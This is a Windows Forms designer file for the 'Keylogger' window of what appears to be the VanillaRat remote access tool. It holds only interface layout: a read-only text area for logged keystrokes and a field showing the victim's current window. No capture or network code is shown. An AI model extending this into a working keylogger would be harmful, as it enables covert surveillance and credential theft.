namespace VanillaRat.Forms
{
    partial class Keylogger
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.txtKeylogger = new System.Windows.Forms.RichTextBox();
            this.panel1 = new System.Windows.Forms.Panel();
            this.txtCurrentWindow = new System.Windows.Forms.TextBox();
            this.lblWindowName = new System.Windows.Forms.Label();
            this.panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // txtKeylogger
            // 
            this.txtKeylogger.BackColor = System.Drawing.SystemColors.Window;
            this.txtKeylogger.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.txtKeylogger.Location = new System.Drawing.Point(-1, 0);
            this.txtKeylogger.Name = "txtKeylogger";
            this.txtKeylogger.ReadOnly = true;
            this.txtKeylogger.Size = new System.Drawing.Size(620, 317);
            this.txtKeylogger.TabIndex = 0;
            this.txtKeylogger.Text = "";
            // 
            // panel1
            // 
            this.panel1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.panel1.Controls.Add(this.txtKeylogger);
            this.panel1.Location = new System.Drawing.Point(12, 12);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(620, 318);
            this.panel1.TabIndex = 1;
            // 
            // txtCurrentWindow
            // 
            this.txtCurrentWindow.Location = new System.Drawing.Point(101, 339);
            this.txtCurrentWindow.Name = "txtCurrentWindow";
            this.txtCurrentWindow.ReadOnly = true;
            this.txtCurrentWindow.Size = new System.Drawing.Size(531, 20);
            this.txtCurrentWindow.TabIndex = 1;
            // 
            // lblWindowName
            // 
            this.lblWindowName.AutoSize = true;
            this.lblWindowName.Location = new System.Drawing.Point(9, 342);
            this.lblWindowName.Name = "lblWindowName";
            this.lblWindowName.Size = new System.Drawing.Size(86, 13);
            this.lblWindowName.TabIndex = 2;
            this.lblWindowName.Text = "Current Window:";
            // 
            // Keylogger
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.SystemColors.Control;
            this.ClientSize = new System.Drawing.Size(644, 368);
            this.Controls.Add(this.lblWindowName);
            this.Controls.Add(this.txtCurrentWindow);
            this.Controls.Add(this.panel1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Name = "Keylogger";
            this.ShowIcon = false;
            this.Text = "Keylogger";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Keylogger_FormClosing);
            this.panel1.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        public System.Windows.Forms.RichTextBox txtKeylogger;
        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Label lblWindowName;
        public System.Windows.Forms.TextBox txtCurrentWindow;
    }
}